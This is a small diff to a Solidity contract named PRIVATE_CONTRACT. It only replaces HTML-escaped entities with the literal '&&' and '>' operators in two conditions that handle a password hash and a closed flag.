@@ -36,7 +36,7 @@ contract PRIVATE_CONTRACT
     public
     payable
     {
-        if( (!closed&amp;&amp;(msg.value &gt; 1 ether)) || hashPass==0x00)
+        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x00)
         {
             hashPass = hash;
             sender = msg.sender;
@@ -56,7 +56,7 @@ contract PRIVATE_CONTRACT
     function PassHasBeenSet(bytes32 hash)
     public
     {
-        if(hash==hashPass&amp;&amp;msg.sender==sender)
+        if(hash==hashPass&&msg.sender==sender)
         {
            closed=true;
         }
